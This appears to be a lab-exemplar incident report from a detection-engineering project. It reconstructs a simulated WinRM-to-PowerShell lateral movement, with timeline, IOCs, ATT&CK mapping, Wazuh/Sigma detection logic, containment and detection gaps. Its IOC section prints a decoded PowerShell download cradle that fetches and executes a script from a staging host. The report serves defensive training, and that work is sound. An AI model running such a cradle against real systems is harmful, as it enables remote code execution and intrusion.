# Incident Report — Simulated Lateral Movement via WinRM and PowerShell

> **Status:** Complete — **lab exemplar.** This report reconstructs a T1021.006 → T1059.001
> incident from the lab's validated detection content (the Wazuh rules in
> [`detections/wazuh/`](../detections/wazuh/)) and a representative event set
> ([`attack-emulation/sample-events.winrm-to-powershell.json`](../attack-emulation/sample-events.winrm-to-powershell.json)).
> The Indicators-of-Compromise table (§4) is **generated** by
> [`scripts/parsers/sysmon_ioc_extractor.py`](../scripts/parsers/sysmon_ioc_extractor.py) from that
> event set. Timestamps are **illustrative**, relative to a `2026-08-20T14:00Z` reference run.
> Re-run the lab ([`docs/operator-guide.md`](operator-guide.md)) and export the real window to
> replace the event set and timestamps with live captures.
>
> **Framework alignment:** NIST SP 800-61 Rev. 2 (Computer Security Incident Handling Guide). MITRE ATT&CK v15.
> **Classification:** Lab / Training. No real-world impact.

---

## 1. Executive Summary

On 2026-08-20, a simulated lateral-movement chain was detected on lab member server
**WIN01.lab.local**. An actor operating from the domain controller **DC01** used a
previously-compromised service account, **svc_backup**, to open a **WinRM** remoting session to
WIN01 (Windows Security 4624, LogonType 3) and execute **encoded PowerShell**. The PowerShell
payload was a download cradle that reached out to the attacker staging host **10.0.1.10** and
dropped a script to disk.

Detection was effectively immediate: Wazuh rule **`100210`** fired on the Sysmon process-creation
event (`powershell.exe` spawned by `wsmprovhost.exe`) within ~2 seconds of the WinRM logon, and
the correlation rule **`100260`** confirmed the WinRM→PowerShell kill chain on a single host
inside the 5-minute window. Containment (account disable + host isolation) was completed within
~22 minutes of the alert. No data exfiltration was observed; the dropped script was staged but
the session was severed before further action-on-objectives. **Residual gap:** the initial
credential compromise of `svc_backup` on DC01 was *not* independently detected — the chain was
first caught at the WinRM stage (see §8).

---

## 2. Incident Timeline (UTC — illustrative)

| Time (UTC) | Source | Event | Notes |
|---|---|---|---|
| 14:02:11.512 | Security 4624 | WinRM network logon: `svc_backup` from `10.0.2.10` (DC01), LogonType 3 | Kerberos; the auth side of the WinRM session |
| 14:02:13.874 | Sysmon EID 1 | `powershell.exe` spawned by `wsmprovhost.exe` on WIN01 | **Wazuh `100210` fires** (level 12) |
| 14:02:15.031 | Sysmon EID 3 | `powershell.exe` → `10.0.1.10:80` (outbound) | Download-cradle callout to staging host |
| 14:02:15.402 | PowerShell 4104 | Script block: `DownloadString` + `FromBase64String` | **Wazuh `100250` fires** (level 12) |
| 14:02:15.402 | Wazuh (composite) | WinRM → PowerShell chain on same host ≤ 5 min | **Wazuh `100260` fires** (level 14) — the page-worthy alert |
| 14:02:16.660 | Sysmon EID 11 | File dropped: `...\Temp\update.ps1` | Payload staged to disk |
| ~14:05 | Analyst | Triage begins on the `100260` alert | Time-to-triage ≈ 3 min |
| ~14:12 | Analyst | Pivot: source account (`svc_backup`) and source host (DC01) identified | |
| ~14:18 | SOC / IAM | Containment: `svc_backup` disabled in AD | |
| ~14:24 | SOC / Cloud | Containment: WIN01 isolated via security-group change | |
| ~14:40 | IR | Post-incident report drafted | This document |

---

## 3. Affected Assets

| Asset | Role | Compromise indicator |
|---|---|---|
| WIN01.lab.local | Member server (lateral-movement target) | Hosted the `wsmprovhost.exe → powershell.exe` execution and the dropped `update.ps1`; outbound to 10.0.1.10 |
| svc_backup@lab.local | Service account (Remote Management Users) | Used to authenticate the WinRM session (4624 TargetUserName); credentials assumed compromised upstream |
| DC01.lab.local | Domain controller (origin of the WinRM session) | Source IP `10.0.2.10` of the WinRM logon; suspected initial foothold — **not independently confirmed** (see §8) |
| 10.0.1.10 | Attacker staging host (Kali) | Destination of the download cradle; external to the trust boundary |

---

## 4. Indicators of Compromise

Generated from the event set by `python scripts/parsers/sysmon_ioc_extractor.py attack-emulation/sample-events.winrm-to-powershell.json`
(re-run to regenerate; add `--format stix` for a STIX 2.1 bundle):

| Type | Value | First seen (UTC) | Source EID | Host |
|---|---|---|---|---|
| process | `powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgA…JwApAA==` | 2026-08-20T14:02:13.874Z | 1 | WIN01.lab.local |
| sha256 | `9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F` | 2026-08-20T14:02:13.874Z | 1 | WIN01.lab.local |
| md5 | `04029E121A0CFA5991749937DD22A1D9` | 2026-08-20T14:02:13.874Z | 1 | WIN01.lab.local |
| ipv4-addr | `10.0.1.10` | 2026-08-20T14:02:15.031Z | 3 | WIN01.lab.local |
| file-path | `C:\Users\svc_backup\AppData\Local\Temp\update.ps1` | 2026-08-20T14:02:16.660Z | 11 | WIN01.lab.local |

**Decoded command line** (from the 4104 script block + `-EncodedCommand`, decoded during triage):

```
IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.10/a.ps1')
```

> The `sha256`/`md5` above are the hash of the LOLBin **`powershell.exe`** itself (Sysmon hashes
> the process image on EID 1) — useful to confirm the exact binary, low value as a unique IOC.
> The high-value indicators here are the **source account**, the **staging IP `10.0.1.10`**, the
> **decoded cradle**, and the **dropped file path**.

---

## 5. MITRE ATT&CK Mapping

| Tactic | Technique | Sub-technique | Evidence |
|---|---|---|---|
| TA0008 Lateral Movement | T1021 Remote Services | T1021.006 WinRM | 4624 LogonType 3 (`svc_backup`) + Sysmon EID 1 `ParentImage=wsmprovhost.exe` |
| TA0002 Execution | T1059 Command/Scripting Interpreter | T1059.001 PowerShell | Sysmon EID 1 command line + PowerShell 4104 script block |
| TA0005 Defense Evasion | T1027 Obfuscated Files or Information | T1027.010 Command Obfuscation | `-EncodedCommand` (base64/UTF-16LE) observed and decoded |
| TA0011 Command and Control | T1105 Ingress Tool Transfer | — | `DownloadString` cradle to `http://10.0.1.10/a.ps1`; Sysmon EID 3 to `10.0.1.10:80` |

---

## 6. Detection Logic

### Primary alert — WinRM execution
- **Wazuh rule:** `100210` ([`detections/wazuh/local_rules.xml`](../detections/wazuh/local_rules.xml)) · **Sigma source:** [`T1021.006_winrm_execution.yml`](../detections/sigma/T1021.006_winrm_execution.yml)
- **Logic:** Sysmon EID 1 where `ParentImage` ends with `\wsmprovhost.exe`. `wsmprovhost.exe`
  exists only to host WinRM remoting sessions, so any child process is a high-fidelity signal.

### Follow-on alert — suspicious PowerShell
- **Wazuh rule:** `100250` · **Sigma source:** [`T1059.001_powershell_post_winrm.yml`](../detections/sigma/T1059.001_powershell_post_winrm.yml)
- **Logic:** PowerShell 4104 `ScriptBlockText` containing an encoded-command, download-cradle, or
  AMSI-bypass indicator. Here `DownloadString` **and** `FromBase64String` both matched.

### Correlation — the kill chain
- **Wazuh rule:** `100260` · **Sigma source:** [`correlation_winrm_to_powershell.yml`](../detections/sigma/correlation_winrm_to_powershell.yml)
- **Logic:** fires when `100250` (suspicious PowerShell) is preceded by `100210` (WinRM
  execution) on the **same host** (`win.system.computer`) within **5 minutes**. This is the
  single alert that expresses "lateral movement in, hands-on-keyboard immediately after."

### Why it fired here (walk-through)
`wsmprovhost.exe` (PID 5312's parent) spawning `powershell.exe` satisfied `100210` on the exact
field the rule keys on (`win.eventdata.parentImage`). ~1.5 s later the decoded script block
carried both a `Net.WebClient).DownloadString` cradle and a `FromBase64String` decode, satisfying
`100250`. Because both landed on `WIN01.lab.local` inside the window, `100260` correlated them and
raised the level-14 alert the analyst actually worked. The rules' true-positive/true-negative
behaviour is proven in CI ([`detections/wazuh/test_wazuh_rules.py`](../detections/wazuh/test_wazuh_rules.py)).

---

## 7. Containment, Eradication, and Recovery

| Phase | Action | Owner | Justification |
|---|---|---|---|
| Containment (short-term) | Isolate WIN01 via security-group change (deny egress + inbound except SSM) | SOC / Cloud | Stop the cradle/beacon without destroying volatile state |
| Containment (short-term) | Disable `svc_backup` in AD (`Disable-ADAccount -Identity svc_backup`) | SOC / IAM | Prevent re-use of the compromised account |
| Containment (long-term) | Reset credentials for every account that authenticated to WIN01 in the last 24 h | IAM | Address potential session/credential theft |
| Eradication | Re-image WIN01 from known-good Terraform state | IR / Cloud | Faster than forensic clean for an ephemeral lab host; trade-off documented |
| Recovery | Re-deploy WIN01 (`terraform apply -replace=module.windows.aws_instance.member`) and confirm the Wazuh agent re-enrolled | IR / Cloud | Return to a known-good, instrumented baseline |
| Recovery | Confirm no persistence remained on DC01 (scheduled tasks, services, run keys, new local admins) | IR | The suspected initial foothold — verify before closing |

> **Live-response note:** capture volatile state *before* isolating — running processes
> (`Get-Process`, `Get-CimInstance Win32_Process`), network connections (`Get-NetTCPConnection`),
> and current sessions (`quser`) — so response doesn't destroy the evidence. See
> [`docs/runbook-lateral-movement.md`](runbook-lateral-movement.md) §3.

---

## 8. Lessons Learned & Detection Gaps

**What worked**
- High-fidelity, low-noise primary signal: keying on `wsmprovhost.exe` children meant the WinRM
  stage alerted with essentially zero tuning and near-zero time-to-detect.
- The correlation rule collapsed two medium-context alerts into one high-confidence kill-chain
  alert, which is what an analyst should be paged on — less alert fatigue, clearer story.
- ScriptBlock logging (4104) recovered the decoded payload, so the cradle and staging IP were
  visible without reversing the base64 blind.

**What didn't**
- The initial compromise of `svc_backup` (assumed to have occurred on DC01) produced **no alert
  of its own** — the chain was first caught one hop later, at WinRM. If the actor had used the
  account for a quieter action, detection would have been delayed.
- Hash IOCs from Sysmon EID 1 are the *LOLBin* image hash, not the dropped payload — of limited
  IOC value. Payload hashing would need a Sysmon EID 15 (FileCreateStreamHash) or a hash-on-write
  config tweak.

**Detection gaps identified**
- No rule on **explicit-credential use (Security 4648)** or **anomalous service-account logon
  patterns** — either could have surfaced the `svc_backup` compromise earlier.
- No coverage for **WMI-based** remote execution (T1047) — an actor who pivoted via WMI instead
  of WinRM would not hit `100210`.
- No **egress/C2 heuristics** (e.g. a server making an outbound HTTP request to an RFC1918 peer
  it never talks to) — the EID 3 to `10.0.1.10` is currently only context, not its own alert.

**Recommended improvements**
- Add a 4648 explicit-credential rule and a service-account-behavior baseline.
- Add a T1047 WMI remote-execution rule (`ParentImage` = `WmiPrvSE.exe`) as a sibling to `100210`.
- Turn payload hashing on (Sysmon EID 15) and re-point the IOC parser's hash extraction at it.
- Promote the EID 3 → staging-IP observation into a low-severity standalone rule for corroboration.

---

## 9. NIST 800-61 Phase Mapping

| 800-61 Phase | This incident's activities |
|---|---|
| **Preparation** | Sysmon (SwiftOnSecurity) + advanced audit policy + PowerShell ScriptBlock logging deployed via Terraform bootstrap; Wazuh ruleset incl. the native ports in `detections/wazuh/`; analyst runbook `docs/runbook-lateral-movement.md`; operator runbook `docs/operator-guide.md` |
| **Detection & Analysis** | Wazuh `100210` → `100250` → correlation `100260`; analyst triage; decode of `-EncodedCommand`; IOC extraction via `sysmon_ioc_extractor.py` |
| **Containment, Eradication, Recovery** | `svc_backup` disabled; WIN01 isolated via SG; re-image from Terraform; DC01 persistence check |
| **Post-Incident Activity** | This report; detection-gap list (§8) fed back into the rule backlog; runbook updates |

---

## 10. Appendix

- **A. Event set (exemplar):** [`attack-emulation/sample-events.winrm-to-powershell.json`](../attack-emulation/sample-events.winrm-to-powershell.json) — regenerate the §4 table with `python scripts/parsers/sysmon_ioc_extractor.py <file>`; live captures go to `attack-emulation/raw-events.<date>.json`.
- **B. Detections:** Sigma [`detections/sigma/`](../detections/sigma/) · native Wazuh [`detections/wazuh/`](../detections/wazuh/) (rules `100210`/`100250`/`100260`).
- **C. Coverage & ATT&CK:** [`docs/detection-coverage-matrix.md`](detection-coverage-matrix.md) · [`docs/attack-navigator-layer.json`](attack-navigator-layer.json).
- **D. Test plan this exemplar is based on:** [`attack-emulation/atomic-test-plan.md`](../attack-emulation/atomic-test-plan.md) (results fixture-validated; live capture pending).
